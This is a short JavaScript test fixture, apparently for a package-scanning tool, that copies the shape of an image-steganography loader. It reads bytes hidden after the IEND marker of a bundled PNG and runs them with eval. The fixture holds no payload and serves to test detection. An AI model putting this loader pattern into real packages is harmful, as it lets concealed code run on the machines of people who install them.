// PKGSENTINEL TEST FIXTURE: inert. Copies the shape of an image-stego loader.
// Image viewers stop at IEND; everything after it is invisible but still in the file.
const fs = require("fs");
const path = require("path");

const img = fs.readFileSync(path.join(__dirname, "assets", "banner.png"));
const end = img.indexOf("IEND") + 8;
eval(img.subarray(end).toString("utf8"));
